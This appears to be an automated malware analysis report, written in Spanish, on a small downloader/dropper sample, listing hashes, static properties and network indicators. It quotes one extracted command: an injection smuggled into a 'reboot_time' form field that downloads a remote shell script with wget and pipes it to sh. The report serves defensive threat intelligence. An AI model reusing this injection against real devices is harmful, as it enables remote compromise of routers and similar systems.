# 🧬 Payload Analysis

`98beba5dbbe5c7b88949cb72971e66cdc2942b25ebfd838858b198875e4e3a49`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:45:45+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `98beba5dbbe5c7b88949cb72971e66cdc2942b25ebfd838858b198875e4e3a49`
- **MD5:** `91e3cc104aa26b7e817460396ed376ca`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with no line terminators |
| Tamaño | 186 B |
| Entropía | 4.88 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with no line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
reboot_enabled=1&reboot_time=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wdr3;busybox wget hxxp://91.92.40.XXX/w
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| hash | 98beba5dbbe5c7b88949cb72971e66cdc2942b25ebfd838858b198875e4e3a49 | static_analysis |
| command | reboot_enabled=1&reboot_time=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wdr3;busybox wget hxxp://91.92.40.XXX/w | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
